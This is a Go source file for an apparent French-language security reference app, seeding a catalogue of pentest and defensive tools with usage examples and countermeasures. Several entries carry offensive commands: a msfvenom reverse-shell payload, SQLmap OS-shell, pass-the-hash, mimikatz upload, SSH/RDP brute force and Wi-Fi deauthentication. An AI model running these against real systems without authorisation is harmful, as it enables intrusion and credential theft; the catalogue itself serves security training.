package store

import (
	"github.com/cyber-hub/cyber-hub/internal/models"
	"strings"
)

// ListTools retourne les outils avec filtres et pagination optionnels.
// Si page=0 ou limit=0, retourne tous les résultats (comportement legacy).
func ListTools(category, subCategory, os, search string, page, limit int) ([]models.Tool, int64, error) {
	query := DB.Model(&models.Tool{})

	if category != "" {
		query = query.Where("category = ?", category)
	}
	if subCategory != "" {
		query = query.Where("sub_category = ?", subCategory)
	}
	if os != "" {
		query = query.Where("os = ? OR os = 'both'", os)
	}
	if search != "" {
		term := "%" + strings.ToLower(search) + "%"
		query = query.Where(
			"LOWER(name) LIKE ? OR LOWER(description) LIKE ? OR LOWER(tags) LIKE ?",
			term, term, term,
		)
	}

	var total int64
	query.Count(&total)

	query = query.Order("name ASC")
	if page > 0 && limit > 0 {
		query = query.Offset((page - 1) * limit).Limit(limit)
	}

	var tools []models.Tool
	err := query.Find(&tools).Error
	return tools, total, err
}

// GetToolByID retourne un outil par son ID
func GetToolByID(id uint) (*models.Tool, error) {
	var tool models.Tool
	err := DB.First(&tool, id).Error
	return &tool, err
}

// CreateTool crée un nouvel outil
func CreateTool(req *models.ToolCreateRequest) (*models.Tool, error) {
	level := req.EthicalLevel
	if level == "" {
		level = models.EthicalStandard
	}
	tool := models.Tool{
		Name:            req.Name,
		Category:        req.Category,
		SubCategory:     req.SubCategory,
		OS:              req.OS,
		Description:     req.Description,
		Install:         req.Install,
		Usage:           req.Usage,
		Examples:        req.Examples,
		Defense:         req.Defense,
		Procedure:       req.Procedure,
		EthicalLevel:    level,
		LegalNotes:      req.LegalNotes,
		EthicalUseCases: req.EthicalUseCases,
		CommandTemplate: req.CommandTemplate,
		InputSchema:     req.InputSchema,
		UserNotes:       req.UserNotes,
		Tags:            req.Tags,
	}
	err := DB.Create(&tool).Error
	return &tool, err
}

// UpdateTool met à jour un outil existant
func UpdateTool(id uint, req *models.ToolCreateRequest) (*models.Tool, error) {
	tool, err := GetToolByID(id)
	if err != nil {
		return nil, err
	}

	level := req.EthicalLevel
	if level == "" {
		level = models.EthicalStandard
	}
	tool.Name = req.Name
	tool.Category = req.Category
	tool.SubCategory = req.SubCategory
	tool.OS = req.OS
	tool.Description = req.Description
	tool.Install = req.Install
	tool.Usage = req.Usage
	tool.Examples = req.Examples
	tool.Defense = req.Defense
	tool.Procedure = req.Procedure
	tool.EthicalLevel = level
	tool.LegalNotes = req.LegalNotes
	tool.EthicalUseCases = req.EthicalUseCases
	tool.CommandTemplate = req.CommandTemplate
	tool.InputSchema = req.InputSchema
	tool.UserNotes = req.UserNotes
	tool.Tags = req.Tags

	err = DB.Save(tool).Error
	return tool, err
}

// DeleteTool supprime un outil par son ID
func DeleteTool(id uint) error {
	return DB.Delete(&models.Tool{}, id).Error
}

// GetSubCategories retourne la liste distincte des sous-catégories
func GetSubCategories() ([]string, error) {
	var results []string
	err := DB.Model(&models.Tool{}).
		Distinct("sub_category").
		Pluck("sub_category", &results).Error
	return results, err
}

// GetStats retourne des statistiques rapides pour le dashboard
func GetStats() (map[string]int64, error) {
	var total, offensive, defensive int64
	var ctfTotal, ctfCompleted int64
	var cveTotal, cveCritical int64
	var playbooksTotal int64

	DB.Model(&models.Tool{}).Count(&total)
	DB.Model(&models.Tool{}).Where("category = ?", "offensive").Count(&offensive)
	DB.Model(&models.Tool{}).Where("category = ?", "defensive").Count(&defensive)

	DB.Model(&models.CTFWriteup{}).Count(&ctfTotal)
	DB.Model(&models.CTFWriteup{}).Where("completed = ?", true).Count(&ctfCompleted)

	DB.Model(&models.CVEEntry{}).Count(&cveTotal)
	DB.Model(&models.CVEEntry{}).Where("severity = ?", "critical").Count(&cveCritical)

	DB.Model(&models.Playbook{}).Count(&playbooksTotal)

	return map[string]int64{
		"tools_total":     total,
		"offensive":       offensive,
		"defensive":       defensive,
		"ctf_total":       ctfTotal,
		"ctf_completed":   ctfCompleted,
		"cve_total":       cveTotal,
		"cve_critical":    cveCritical,
		"playbooks_total": playbooksTotal,
	}, nil
}

// SeedTools insère ou met à jour les outils de référence.
// Utilise un upsert par nom : les nouveaux outils sont ajoutés sans toucher aux existants.
func SeedTools() error {
	seeds := []models.ToolCreateRequest{
		{
			Name: "Nmap", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalElevated,
			OS: "both", Tags: "scan,réseau,recon,ports",
			Description: "Scanner de ports et d'hôtes réseau. Outil incontournable pour la reconnaissance réseau et l'audit de sécurité.",
			Install: "**Windows** : Télécharger l'installeur sur https://nmap.org/download.html\n\n**Linux (Debian/Ubuntu)** :\n```bash\nsudo apt install nmap\n```",
			Usage: "```bash\n# Syntaxe de base\nnmap [options] <cible>\n\n# Options principales\n-sV    # Détection de version des services\n-sC    # Scripts NSE par défaut\n-O     # Détection d'OS\n-p-    # Scanner tous les ports (1-65535)\n-A     # Scan agressif (-sV -sC -O --traceroute)\n-T4    # Timing agressif (plus rapide)\n--open # Afficher uniquement les ports ouverts\n```",
			Examples: "```bash\n# Scan rapide des ports courants\nnmap -T4 192.168.1.1\n\n# Scan complet avec détection de service\nnmap -sV -sC -p- -T4 192.168.1.1\n\n# Découverte d'hôtes sur un réseau\nnmap -sn 192.168.1.0/24\n\n# Scan furtif SYN\nnmap -sS -T2 192.168.1.1\n\n# Export XML pour exploitation\nnmap -oX scan.xml -A 192.168.1.1\n```",
			Defense: "**Détection** :\n- Les scans Nmap génèrent un grand nombre de connexions en peu de temps → IDS/IPS (Snort, Suricata) les détectent facilement\n- Logs firewall : connexions TCP SYN sans ACK sur de nombreux ports\n\n**Contre-mesures** :\n- Activer un IDS/IPS avec règles anti-scan\n- Limiter le taux de connexions entrantes (iptables `-m limit`)\n- Port knocking pour les services sensibles\n- Désactiver les services inutiles",
		},
		{
			Name: "Hydra", Category: "offensive", SubCategory: "brute-force",
			EthicalLevel: models.EthicalWarning,
			OS: "both", Tags: "brute-force,mot-de-passe,authentification",
			Description: "Outil de brute force multi-protocoles (SSH, FTP, HTTP, RDP, SMB...). Très rapide grâce au parallélisme.",
			Install: "**Linux** :\n```bash\nsudo apt install hydra\n```\n\n**Windows** : Utiliser depuis WSL2 ou Kali Linux",
			Usage: "```bash\n# Syntaxe\nhydra -l <user> -P <wordlist> <protocole>://<cible>\n\n# Options clés\n-l  <login>    # login unique\n-L  <fichier>  # liste de logins\n-p  <pass>     # mot de passe unique\n-P  <fichier>  # wordlist\n-t  <n>        # threads parallèles (défaut: 16)\n-s  <port>     # port personnalisé\n-V             # mode verbose (affiche chaque tentative)\n```",
			Examples: "```bash\n# Brute force SSH\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10\n\n# Brute force HTTP Basic Auth\nhydra -l admin -P passwords.txt http-get://192.168.1.10/admin\n\n# Brute force formulaire web (HTTP POST)\nhydra -l admin -P passwords.txt 192.168.1.10 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\"\n\n# Brute force RDP\nhydra -l administrator -P passwords.txt rdp://192.168.1.10\n```",
			Defense: "**Détection** :\n- Multiples échecs d'authentification rapides dans les logs\n- fail2ban détecte et bannit automatiquement\n\n**Contre-mesures** :\n- Activer fail2ban (SSH, HTTP...)\n- Limiter les tentatives de connexion (account lockout)\n- Authentification par clé SSH (désactiver password auth)\n- 2FA sur tous les services exposés\n- Changer les ports par défaut",
		},
		{
			Name: "Wireshark", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "capture,réseau,analyse,trafic,paquets",
			Description: "Analyseur de protocoles réseau. Capture et analyse le trafic en temps réel ou depuis des fichiers PCAP.",
			Install: "**Windows/Linux** : https://www.wireshark.org/download.html\n\n```bash\n# Linux\nsudo apt install wireshark\nsudo usermod -aG wireshark $USER\n```",
			Usage: "**Interface graphique** : Sélectionner une interface → Start Capture\n\n**Filtres de capture (BPF)** :\n```\ntcp port 80          # Trafic HTTP\nhost 192.168.1.1     # Trafic vers/depuis une IP\nnot arp              # Exclure ARP\n```\n\n**Filtres d'affichage** :\n```\nhttp                 # Paquets HTTP\nip.addr == 10.0.0.1  # IP spécifique\ntcp.flags.syn == 1   # Paquets SYN\ndns                  # Requêtes DNS\n```",
			Examples: "```bash\n# CLI (tshark) - capturer 100 paquets HTTP\ntshark -i eth0 -c 100 -Y http\n\n# Capturer vers un fichier PCAP\ntshark -i eth0 -w capture.pcap\n\n# Lire un fichier PCAP et filtrer\ntshark -r capture.pcap -Y \"http.request.method == POST\"\n\n# Extraire les credentials HTTP Basic\ntshark -r capture.pcap -Y http -T fields -e http.authorization\n```",
			Defense: "",
		},
		{
			Name: "Metasploit Framework", Category: "offensive", SubCategory: "exploitation",
			EthicalLevel: models.EthicalWarning,
			OS: "linux", Tags: "exploitation,payload,meterpreter,post-exploitation",
			Description: "Framework d'exploitation le plus utilisé en pentest. Contient des milliers d'exploits, payloads et modules auxiliaires.",
			Install: "**Linux (Kali)** : Pré-installé\n\n**Linux (autre)** :\n```bash\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall\nchmod 755 msfinstall && ./msfinstall\n```",
			Usage: "```bash\n# Lancer la console\nmsfconsole\n\n# Commandes de base dans msfconsole\nsearch <terme>      # Chercher un exploit/module\nuse <module>        # Charger un module\ninfo                # Infos sur le module chargé\nshow options        # Afficher les options\nset <OPT> <val>     # Configurer une option\nrun / exploit       # Lancer l'exploit\nsessions -l         # Lister les sessions actives\nsessions -i <id>    # Interagir avec une session\n```",
			Examples: "```bash\n# Scan de vulnérabilités SMB (EternalBlue check)\nuse auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.0/24\nrun\n\n# Générer un payload (msfvenom)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > payload.exe\n\n# Listener pour recevoir le payload\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.1\nset LPORT 4444\nrun\n```",
			Defense: "**Détection** :\n- Signatures connues détectées par la plupart des AV/EDR\n- Trafic Meterpreter détectable par IDS (patterns spécifiques)\n- Logs d'erreurs applicatives lors d'exploitation\n\n**Contre-mesures** :\n- Patcher régulièrement les systèmes (WSUS, apt)\n- EDR sur tous les endpoints (Wazuh, Defender ATP)\n- Segmentation réseau (limiter les mouvements latéraux)\n- Monitoring des connexions sortantes anormales",
		},
		{
			Name: "Gobuster", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS: "both", Tags: "fuzzing,web,répertoires,brute-force,enumération",
			Description: "Outil de brute force pour la découverte de répertoires, fichiers et sous-domaines web. Très rapide (Go concurrent).",
			Install: "```bash\n# Linux\nsudo apt install gobuster\n\n# Ou depuis les binaires Go\ngo install github.com/OJ/gobuster/v3@latest\n```",
			Usage: "```bash\ngobuster dir -u <URL> -w <wordlist> [options]\n\n# Options dir\n-u   URL cible\n-w   wordlist\n-x   extensions (php,html,txt)\n-t   threads (défaut 10)\n-s   codes HTTP à afficher (200,301...)\n-b   codes à blacklister\n\n# Mode DNS (sous-domaines)\ngobuster dns -d <domaine> -w <wordlist>\n```",
			Examples: "```bash\n# Enumération de répertoires basique\ngobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt\n\n# Avec extensions et plus de threads\ngobuster dir -u http://10.10.10.1 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt -t 50\n\n# Découverte de sous-domaines\ngobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# Avec authentification HTTP Basic\ngobuster dir -u http://10.10.10.1/admin -w wordlist.txt -U admin -P password\n```",
			Defense: "**Détection** :\n- Pics de requêtes HTTP 404 en très peu de temps\n- User-Agent générique (gobuster/3.x)\n- IDS/WAF détectent les patterns de fuzzing\n\n**Contre-mesures** :\n- WAF avec rate limiting\n- Bloquer les User-Agents de scanners connus\n- Analyser les logs Apache/Nginx pour détecter les rafales 404",
		},
		{
			Name: "Suricata", Category: "defensive", SubCategory: "ids-ips",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "ids,ips,réseau,détection,alertes,règles",
			Description: "IDS/IPS réseau open source haute performance. Analyse le trafic réseau en temps réel et génère des alertes basées sur des règles.",
			Install: "```bash\n# Ubuntu/Debian\nsudo apt install suricata\n\n# Activer et démarrer\nsudo systemctl enable suricata\nsudo systemctl start suricata\n```",
			Usage: "```bash\n# Lancer en mode IDS (lecture seule)\nsudo suricata -c /etc/suricata/suricata.yaml -i eth0\n\n# Analyser un fichier PCAP\nsudo suricata -r capture.pcap -l /var/log/suricata/\n\n# Mettre à jour les règles (Emerging Threats)\nsudo suricata-update\n```\n\n**Fichiers importants** :\n```\n/etc/suricata/suricata.yaml  # Configuration principale\n/var/log/suricata/fast.log   # Alertes rapides\n/var/log/suricata/eve.json   # Logs JSON (SIEM)\n```",
			Examples: "```bash\n# Vérifier la configuration\nsudo suricata -T -c /etc/suricata/suricata.yaml\n\n# Tester une règle personnalisée\necho 'alert tcp any any -> any 80 (msg:\"HTTP test\"; content:\"GET\"; sid:1000001;)' >> /etc/suricata/rules/local.rules\n\n# Voir les alertes en temps réel\ntail -f /var/log/suricata/fast.log\n\n# Parser les logs JSON\njq '.event_type, .alert.signature' /var/log/suricata/eve.json\n```",
			Defense: "",
		},
		{
			Name: "Volatility 3", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "forensics,mémoire,ram,analyse,incident",
			Description: "Framework d'analyse forensique de mémoire RAM. Extrait des artefacts (processus, connexions, malware) depuis des dumps mémoire.",
			Install: "```bash\n# Python 3 requis\npip3 install volatility3\n\n# Ou depuis les sources\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3 && pip3 install -r requirements.txt\n```",
			Usage: "```bash\nvol.py -f <dump.mem> <plugin> [options]\n\n# Plugins essentiels Windows\nwindows.pslist       # Liste des processus\nwindows.pstree       # Arbre des processus\nwindows.cmdline      # Lignes de commande\nwindows.netscan      # Connexions réseau\nwindows.malfind      # Injections mémoire suspectes\nwindows.filescan     # Fichiers ouverts\nwindows.hashdump     # Hashes NTLM\n```",
			Examples: "```bash\n# Identifier le profil OS\nvol.py -f memory.dmp windows.info\n\n# Lister les processus avec PID\nvol.py -f memory.dmp windows.pslist\n\n# Détecter des injections mémoire (malware)\nvol.py -f memory.dmp windows.malfind\n\n# Voir les connexions réseau au moment du dump\nvol.py -f memory.dmp windows.netscan\n\n# Extraire des hashes NTLM\nvol.py -f memory.dmp windows.hashdump\n```",
			Defense: "",
		},
		{
			Name: "CrackMapExec", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalWarning,
			OS: "linux", Tags: "AD,windows,smb,authentification,lateral-movement",
			Description: "Outil de post-exploitation pour les environnements Active Directory. Enumération, authentification et mouvement latéral sur SMB/WinRM/LDAP.",
			Install: "```bash\n# pip (recommandé)\npipx install crackmapexec\n\n# Ou depuis les sources\ngit clone https://github.com/byt3bl33d3r/CrackMapExec\ncd CrackMapExec && pip3 install .\n```",
			Usage: "```bash\ncme <protocole> <cible> [options]\n\n# Protocoles : smb, winrm, ldap, ssh, rdp\n\n# Options communes\n-u <user>     # nom d'utilisateur\n-p <pass>     # mot de passe\n-H <hash>     # hash NTLM (pass-the-hash)\n--shares      # Lister les partages\n--sam         # Dumper SAM\n--lsa         # Dumper LSA\n-x <cmd>      # Exécuter une commande\n```",
			Examples: "```bash\n# Découverte d'hôtes SMB\ncme smb 192.168.1.0/24\n\n# Authentification avec credentials\ncme smb 192.168.1.10 -u administrator -p 'Password123'\n\n# Pass-the-hash\ncme smb 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\n# Lister les partages accessibles\ncme smb 192.168.1.0/24 -u user -p pass --shares\n\n# Exécuter une commande distante\ncme smb 192.168.1.10 -u admin -p pass -x 'whoami /all'\n```",
			Defense: "**Détection** :\n- EventID 4624 (logon) + 4625 (failed logon) en masse\n- Logs SMB avec authentifications multiples sur différents hôtes\n- Honeypots AD (comptes leurres)\n\n**Contre-mesures** :\n- Désactiver SMBv1\n- LAPS (Local Administrator Password Solution)\n- Tiering AD (séparer admin de domaine, local, utilisateur)\n- Audit des connexions SMB/WinRM\n- EDR avec détection de mouvement latéral",
		},
		// ── Outils Phase 5.2 ────────────────────────────────────────────────────
		{
			Name: "SQLmap", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalWarning,
			OS: "both", Tags: "sql-injection,web,database,automated,dump",
			Description: "Outil d'automatisation des injections SQL. Détecte et exploite automatiquement les vulnérabilités SQLi (GET/POST/cookies/headers) sur la plupart des SGBD.",
			Install: "```bash\n# Linux\nsudo apt install sqlmap\n\n# Python (multiplateforme)\ngit clone https://github.com/sqlmapproject/sqlmap\npython3 sqlmap.py\n```",
			Usage: "```bash\nsqlmap -u <url> [options]\n\n# Options principales\n-u <url>         # URL cible (avec paramètre ?id=1)\n--data <data>    # Données POST\n-p <param>       # Paramètre à tester\n--dbs            # Lister les bases de données\n-D <db> --tables # Lister les tables\n-D <db> -T <table> --dump  # Extraire les données\n--level=5        # Niveau de test (1-5)\n--risk=3         # Risque d'altération (1-3)\n--batch          # Mode non-interactif\n```",
			Examples: "```bash\n# Test d'injection GET\nsqlmap -u 'http://10.10.10.1/page?id=1' --dbs\n\n# Injection POST (formulaire)\nsqlmap -u 'http://10.10.10.1/login' --data='user=a&pass=b' -p user\n\n# Extraire une table complète\nsqlmap -u 'http://10.10.10.1/page?id=1' -D webapp -T users --dump\n\n# Contournement WAF\nsqlmap -u 'http://10.10.10.1/page?id=1' --tamper=space2comment\n\n# Obtenir un shell OS\nsqlmap -u 'http://10.10.10.1/page?id=1' --os-shell\n```",
			Defense: "**Détection** :\n- Patterns SQLi dans les logs (UNION SELECT, ' OR '1'='1)\n- WAF avec règles OWASP ModSecurity Core Rule Set\n- SIEM : alertes sur erreurs SQL répétées\n\n**Contre-mesures** :\n- Requêtes préparées (prepared statements) — jamais de concaténation SQL\n- ORM avec paramétrage automatique\n- Validation et sanitisation des entrées\n- Limiter les privilèges DB (pas de DROP en prod)",
		},
		{
			Name: "Nikto", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS: "both", Tags: "web,scan,vulnérabilités,headers,cgi,ssl",
			Description: "Scanner de vulnérabilités web open source. Teste rapidement les serveurs HTTP/HTTPS pour les misconfigurations, headers manquants, fichiers dangereux et CVE connues.",
			Install: "```bash\n# Linux\nsudo apt install nikto\n\n# Ou depuis les sources (Perl requis)\ngit clone https://github.com/sullo/nikto\ncd nikto/program && perl nikto.pl\n```",
			Usage: "```bash\nnikto -h <cible> [options]\n\n-h <url>         # Hôte/URL cible\n-p <port>        # Port (défaut 80)\n-ssl             # Forcer HTTPS\n-o <fichier>     # Exporter rapport (-Format html|csv|xml)\n-Tuning <x>      # Types de tests (1=info, 2=misconfig...)\n-evasion <x>     # Techniques d'évasion IDS\n```",
			Examples: "```bash\n# Scan basique\nnikto -h http://10.10.10.1\n\n# Scan HTTPS\nnikto -h https://10.10.10.1 -ssl\n\n# Port non-standard + export HTML\nnikto -h 10.10.10.1 -p 8080 -o rapport.html -Format htm\n\n# Scan avec évasion IDS\nnikto -h http://10.10.10.1 -evasion 1\n```",
			Defense: "**Contre-mesures** :\n- WAF avec règles anti-scanner\n- Security headers : X-Frame-Options, CSP, HSTS\n- Supprimer les fichiers par défaut (readme.html, test.php...)\n- Désactiver les méthodes HTTP inutiles (TRACE, PUT, DELETE)",
		},
		{
			Name: "ffuf", Category: "offensive", SubCategory: "web",
			EthicalLevel: models.EthicalElevated,
			OS: "both", Tags: "fuzzing,web,répertoires,sous-domaines,paramètres,rapide",
			Description: "Fast web fuzzer écrit en Go. Extrêmement rapide pour le fuzzing de répertoires, sous-domaines, paramètres GET/POST et valeurs. Remplace souvent gobuster et wfuzz.",
			Install: "```bash\n# Go\ngo install github.com/ffuf/ffuf/v2@latest\n\n# Linux\nsudo apt install ffuf\n\n# Binaire : https://github.com/ffuf/ffuf/releases\n```",
			Usage: "```bash\nffuf -w <wordlist> -u <url_avec_FUZZ> [options]\n\n-w   wordlist\n-u   URL (utiliser FUZZ comme placeholder)\n-H   Header (ex: 'Host: FUZZ.domaine.com')\n-d   Data POST (ex: 'user=FUZZ&pass=test')\n-fs  Filtrer par taille de réponse (exclure)\n-fc  Filtrer par code HTTP\n-mc  Matcher par code HTTP\n-t   Threads (défaut 40)\n-e   Extensions (ex: .php,.html)\n```",
			Examples: "```bash\n# Fuzzing de répertoires\nffuf -w /wordlists/common.txt -u http://10.10.10.1/FUZZ\n\n# Fuzzing avec extensions\nffuf -w /wordlists/common.txt -u http://10.10.10.1/FUZZ -e .php,.html,.bak\n\n# Fuzzing sous-domaines\nffuf -w /wordlists/subdomains.txt -u http://FUZZ.cible.com\n\n# Filtrer les 404 par taille\nffuf -w /wordlists/common.txt -u http://10.10.10.1/FUZZ -fs 4242\n\n# Fuzzing paramètre GET\nffuf -w /wordlists/params.txt -u 'http://10.10.10.1/page?FUZZ=test'\n```",
			Defense: "**Détection** :\n- Rafales de requêtes 4xx en très peu de temps\n- User-Agent ffuf reconnu par les WAF\n\n**Contre-mesures** :\n- Rate limiting (nginx limit_req)\n- WAF avec détection de fuzzing\n- Retourner un code 200 générique pour les 404 (trompe ffuf)",
		},
		{
			Name: "John the Ripper", Category: "offensive", SubCategory: "password-cracking",
			EthicalLevel: models.EthicalWarning,
			OS: "both", Tags: "crack,hash,password,md5,sha,ntlm,wordlist",
			Description: "Outil de cracking de mots de passe open source. Supporte des centaines de formats de hashes (MD5, SHA, NTLM, bcrypt, ZIP, SSH...). CPU-based, optimisé avec des règles de mutation.",
			Install: "```bash\n# Linux\nsudo apt install john\n\n# Jumbo (plus de formats)\ngit clone https://github.com/openwall/john -b bleeding-jumbo\ncd john/src && ./configure && make\n```",
			Usage: "```bash\njohn [options] <fichier_hash>\n\n--wordlist=<wordlist>  # Dictionnaire\n--rules                # Règles de mutation (leet, capitalisation...)\n--format=<format>      # Forcer le format (raw-md5, nt, bcrypt...)\n--show                 # Afficher les mots de passe crackés\n--incremental          # Mode brute force\n\n# Utilitaires\nssh2john id_rsa > hash    # Extraire hash d'une clé SSH\nzip2john archive.zip > hash\n```",
			Examples: "```bash\n# Crack avec wordlist\njohn --wordlist=/wordlists/rockyou.txt hash.txt\n\n# Avec règles de mutation\njohn --wordlist=/wordlists/rockyou.txt --rules hash.txt\n\n# Forcer format MD5\njohn --format=raw-md5 --wordlist=/wordlists/rockyou.txt hash.txt\n\n# Clé SSH protégée\nssh2john id_rsa > id_rsa.hash\njohn --wordlist=/wordlists/rockyou.txt id_rsa.hash\n\n# Afficher les résultats\njohn --show hash.txt\n```",
			Defense: "**Contre-mesures** :\n- Utiliser bcrypt ou Argon2id (pas MD5 ou SHA1 !)\n- Politique de mots de passe forts (≥12 chars, complexité)\n- Salage des hashes pour contrer les rainbow tables\n- Verrouillage après N tentatives",
		},
		{
			Name: "Aircrack-ng", Category: "offensive", SubCategory: "wifi",
			EthicalLevel: models.EthicalWarning,
			OS: "linux", Tags: "wifi,wpa2,wep,handshake,crack,wireless",
			Description: "Suite d'audit de sécurité Wi-Fi. Capture des handshakes WPA/WPA2, craque des clés WEP, teste les réseaux sans fil. Nécessite une carte Wi-Fi en mode monitor.",
			Install: "```bash\n# Linux\nsudo apt install aircrack-ng\n```",
			Usage: "```bash\n# 1. Mettre la carte en mode monitor\nairmon-ng start wlan0\n\n# 2. Scanner les réseaux\nairodump-ng wlan0mon\n\n# 3. Capturer le handshake WPA2\nairodump-ng -c <canal> --bssid <MAC_AP> -w capture wlan0mon\n\n# 4. Dé-authentifier un client (force la reconnexion)\naireplay-ng -0 5 -a <MAC_AP> -c <MAC_client> wlan0mon\n\n# 5. Cracker le handshake\naircrack-ng -w /wordlists/rockyou.txt capture.cap\n```",
			Examples: "```bash\n# Crack WEP (réseau legacy)\naircrack-ng -b <MAC_AP> capture.cap\n\n# Crack WPA2 avec wordlist\naircrack-ng -w /wordlists/rockyou.txt -b <MAC_AP> capture-01.cap\n\n# Vérifier si handshake capturé\naircrack-ng capture-01.cap\n```",
			Defense: "**Contre-mesures** :\n- WPA3 (résistant aux attaques hors-ligne)\n- Mot de passe Wi-Fi long et aléatoire (≥20 chars)\n- Désactiver WPS (vulnérable au brute force PIN)\n- RADIUS/802.1X pour les entreprises",
		},
		{
			Name: "Evil-WinRM", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalWarning,
			OS: "linux", Tags: "winrm,windows,AD,shell,pentest,remote",
			Description: "Client WinRM offensif pour les tests d'intrusion Active Directory. Fournit un shell PowerShell interactif, upload/download de fichiers, chargement de scripts en mémoire.",
			Install: "```bash\n# Ruby gem\ngem install evil-winrm\n\n# Linux\nsudo apt install evil-winrm\n```",
			Usage: "```bash\nevil-winrm -i <IP> -u <user> -p <password> [options]\nevil-winrm -i <IP> -u <user> -H <NTLM_hash>  # Pass-the-hash\n\n# Options\n-s <script_dir>  # Dossier de scripts PS\n-e <exe_dir>     # Dossier d'exécutables\n-S               # SSL\n```",
			Examples: "```bash\n# Connexion avec credentials\nevil-winrm -i 10.10.10.1 -u administrator -p 'Password123'\n\n# Pass-the-hash\nevil-winrm -i 10.10.10.1 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'\n\n# Upload de fichier\n# (dans le shell evil-winrm)\nupload /local/mimikatz.exe C:\\\\Temp\\\\mimikatz.exe\n\n# Chargement de script PowerShell en mémoire\nevil-winrm -i 10.10.10.1 -u admin -p pass -s /opt/ps_scripts/\n# Puis dans le shell :\nInvoke-BloodHound\n```",
			Defense: "**Contre-mesures** :\n- Désactiver WinRM sur les machines non-nécessaires\n- WinRM uniquement sur des réseaux de gestion dédiés\n- Logging des sessions WinRM (Event ID 169)\n- Tiering AD : pas d'accès WinRM des admins de domaine sur les postes",
		},
		{
			Name: "Enum4linux-ng", Category: "offensive", SubCategory: "active-directory",
			EthicalLevel: models.EthicalElevated,
			OS: "linux", Tags: "smb,AD,enumeration,shares,users,groups,linux",
			Description: "Réécriture Python d'enum4linux pour l'énumération SMB/AD. Extrait utilisateurs, groupes, partages, politiques de mots de passe et informations OS depuis des cibles Windows/Samba.",
			Install: "```bash\n# Linux\npip3 install enum4linux-ng\n\n# Ou depuis sources\ngit clone https://github.com/cddmp/enum4linux-ng\ncd enum4linux-ng && pip3 install -r requirements.txt\n```",
			Usage: "```bash\nenum4linux-ng [options] <IP>\n\n-A          # Tout (recommandé)\n-u <user>   # Utilisateur\n-p <pass>   # Mot de passe\n-oY <file>  # Export YAML\n-oJ <file>  # Export JSON\n```",
			Examples: "```bash\n# Enumération complète anonyme\nenum4linux-ng -A 10.10.10.1\n\n# Avec credentials\nenum4linux-ng -A -u admin -p Password123 10.10.10.1\n\n# Export JSON pour analyse\nenum4linux-ng -A -oJ results.json 10.10.10.1\n```",
			Defense: "**Contre-mesures** :\n- Désactiver les sessions null SMB\n- Restreindre l'accès SMB aux adresses IP autorisées\n- Masquer les informations OS et version Samba\n- Audit régulier des partages accessibles anonymement",
		},
		{
			Name: "YARA", Category: "defensive", SubCategory: "forensics",
			EthicalLevel: models.EthicalStandard,
			OS: "both", Tags: "malware,détection,règles,forensics,threat-hunting",
			Description: "Outil de détection de malware basé sur des règles. Crée des signatures pour identifier des familles de malware, du code malveillant ou des patterns suspects dans des fichiers et processus.",
			Install: "```bash\n# Linux\nsudo apt install yara\n\n# Python (librairie)\npip3 install yara-python\n```",
			Usage: "```bash\nyara [options] <règles.yar> <cible>\n\n-r        # Scan récursif de répertoire\n-s        # Afficher les strings correspondantes\n-w        # Désactiver les warnings\n\n# Structure d'une règle YARA :\nrule NomRègle {\n    meta:\n        description = \"Détecte X\"\n    strings:\n        $a = \"string suspecte\"\n        $b = { 6D 61 6C 77 61 72 65 }  // hex\n    condition:\n        $a or $b\n}\n```",
			Examples: "```bash\n# Scanner un fichier\nyara règles.yar /chemin/fichier.exe\n\n# Scan récursif d'un dossier\nyara -r règles.yar /chemin/dossier/\n\n# Utiliser les règles communautaires (YARAify)\nyara rules/malware_index.yar /tmp/suspect/\n\n# Depuis Python\nimport yara\nrules = yara.compile('règles.yar')\nmatches = rules.match('/tmp/sample.exe')\n```",
			Defense: "",
		},
		{
			Name: "Masscan", Category: "offensive", SubCategory: "network",
			EthicalLevel: models.EthicalElevated,
			OS: "linux", Tags: "scan,réseau,ports,rapide,async,massif",
			Description: "Scanner de ports TCP/UDP ultra-rapide (100 millions de paquets/seconde). Conçu pour scanner l'intégralité d'Internet. Même interface que Nmap mais asynchrone et beaucoup plus rapide.",
			Install: "```bash\n# Linux\nsudo apt install masscan\n\n# Depuis les sources\ngit clone https://github.com/robertdavidgraham/masscan\ncd masscan && make\n```",
			Usage: "```bash\n# ⚠️ Nécessite root (raw sockets)\nmasscan [options] <cible>\n\n-p <ports>          # Ports (80,443 ou 0-65535)\n--rate <n>          # Paquets/sec (défaut: 100)\n--open-only         # Afficher uniquement les ports ouverts\n-oX <fichier>       # Export XML\n--banners           # Récupérer les bannières\n```",
			Examples: "```bash\n# Scan rapide d'un réseau\nmasscan -p 80,443,22,21 192.168.1.0/24 --rate=1000\n\n# Scan de tous les ports\nmasscan -p 0-65535 10.10.10.1 --rate=10000\n\n# Export XML (compatible Nmap)\nmasscan -p 80,443 10.0.0.0/8 --rate=5000 -oX scan.xml\n\n# Avec bannières\nmasscan -p 80 10.10.10.0/24 --banners\n```",
